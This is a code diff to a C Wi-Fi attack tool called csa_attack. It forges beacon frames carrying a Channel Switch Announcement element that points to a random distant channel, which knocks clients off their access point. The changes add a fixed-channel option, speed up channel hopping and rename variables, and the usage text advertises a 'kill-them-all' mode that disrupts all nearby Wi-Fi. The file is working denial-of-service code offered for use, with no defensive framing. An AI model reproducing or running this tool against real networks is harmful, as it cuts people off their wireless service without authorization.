@@ -13,17 +13,20 @@ int Wireless_Channel[58] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10,
 
 void usage()
 {
-    puts("<Default>");
+    puts("<Require Element>");
     puts(" -i : Interface");
     puts(" -s : SSID");
-    puts(" -a : AP mac");
+    puts(" -a : AP mac, ex > aa:bb:cc:dd:ee:ff");
     puts(" if you input -a, you don't have to input -s, The opposite is also the same");
 
-    puts("<option>");
-    puts(" -c : Switching Channel");
+    puts("<Option>");
+    puts(" -c : Fixed your Channel");
     puts(" -t : Time(sec)");
     puts(" -d : STA mac, Attack Type, if This option exists, the packet is sent as unicast");
     puts(" -x : if you input \"kill-them-all\" kill all Wi-Fi,This option doesn't need any option");
+
+    puts("<Example>");
+    puts(" ./csa_attack -i <interface> -s <SSID>");
 }
 
 Param param = {
@@ -143,10 +146,10 @@ void *channel(void *Interface)
     while (true)
     {
         myCh = Wireless_Channel[i];
-        i<57?(i+=1):(i=0);
+        i < 57 ? (i += 1) : (i = 0);
         channel_hopping(Interface, (double)myCh);
-        //printf("mych : %d\n", myCh);
-        usleep(1000000); //1000000 = 1sec
+        // printf("mych : %d\n", myCh);
+        usleep(10000); // 1000000 = 1sec
     }
 }
 
@@ -169,10 +172,16 @@ int csaATK(const unsigned char *Input_STA_MAC, Opt *opt)
         start_time = time(NULL);
     }
     int packet_count = 0;
-
-    if (threadErr = pthread_create(&channel_chg, NULL, channel, (void *)opt->Interface))
+    if (!Op_c)
     {
-        printf("Thread Err = %d\n", threadErr);
+        if (threadErr = pthread_create(&channel_chg, NULL, channel, (void *)opt->Interface))
+        {
+            printf("Thread Err = %d\n", threadErr);
+        }
+    }
+    else{
+        channel_hopping(opt->Interface,opt->Op_f_ch);
+        myCh=opt->Op_f_ch;
     }
     while (true)
     {
@@ -218,25 +227,19 @@ int csaATK(const unsigned char *Input_STA_MAC, Opt *opt)
             if (isBeacon(packet))
             {
                 /*----------이거 함수화----------*/
-                unsigned char ChangeCh;
-                if (Op_c)
-                {
-                    ChangeCh = opt->Op_c_ch;
-                }
-                else
-                {
-                    srand(time(NULL));
+                unsigned char csaCh;
+                srand(time(NULL));
 
-                    while (true)
+                while (true)
+                {
+                    int random = rand() % 58;
+                    if (Wireless_Channel[random] != ApCh && (Wireless_Channel[random] > ApCh + 50 || Wireless_Channel[random] < ApCh - 50))
                     {
-                        int random = rand() % 58;
-                        if (Wireless_Channel[random] != ApCh && (Wireless_Channel[random] > ApCh + 50 || Wireless_Channel[random] < ApCh - 50))
-                        {
-                            ChangeCh = Wireless_Channel[random];
-                            break;
-                        }
+                        csaCh = Wireless_Channel[random];
+                        break;
                     }
                 }
+
                 /*----------이거 함수화----------*/
                 if ((rad->flags >> 4) == 1)
                 {
@@ -286,8 +289,9 @@ int csaATK(const unsigned char *Input_STA_MAC, Opt *opt)
                             ssid_len = tagged->tag_length;
                             ssid = send_packet + not_tag_len + i + 2;
                         }
-                        if(tagged->tag_number == 3){
-                            ApCh=*(send_packet + not_tag_len + i + 2);
+                        if (tagged->tag_number == 3)
+                        {
+                            ApCh = *(send_packet + not_tag_len + i + 2);
                         }
                         if (tagged->tag_number > 37)
                         {
@@ -302,7 +306,7 @@ int csaATK(const unsigned char *Input_STA_MAC, Opt *opt)
                             *(send_packet + not_tag_len + i) = 0x25;
                             *(send_packet + not_tag_len + i + 1) = 0x3;
                             *(send_packet + not_tag_len + i + 2) = 0x1;
-                            *(send_packet + not_tag_len + i + 3) = ChangeCh;
+                            *(send_packet + not_tag_len + i + 3) = csaCh;
                             *(send_packet + not_tag_len + i + 4) = 0x1;
                             csa_inject = true;
                             break;
@@ -321,16 +325,15 @@ int csaATK(const unsigned char *Input_STA_MAC, Opt *opt)
                         *(send_packet + header->caplen) = 0x25;
                         *(send_packet + header->caplen + 1) = 0x3;
                         *(send_packet + header->caplen + 2) = 0x1;
-                        *(send_packet + header->caplen + 3) = ChangeCh;
+                        *(send_packet + header->caplen + 3) = csaCh;
                         *(send_packet + header->caplen + 4) = 0x1;
                     }
-
-                    for (int i = 0; i < 4*8; i++)
+                    for (int i = 0; i < 4 * 8; i++)
                     {
                         if (i == 0)
                         {
-                            channel_hopping(opt->Interface,ApCh);
-                            printf("[%d] [ch:%d] [%d]->[%d] SSID : ", ++packet_count, myCh,ApCh, ChangeCh);
+                            if(ApCh!=myCh){channel_hopping(opt->Interface, ApCh);}
+                            printf("[%d] [ch:%d] [%d]->[%d] SSID : ", ++packet_count, myCh, ApCh, csaCh);
                             for (int i = 0; i < ssid_len; i++)
                             {
                                 printf("%c", *(ssid + i));
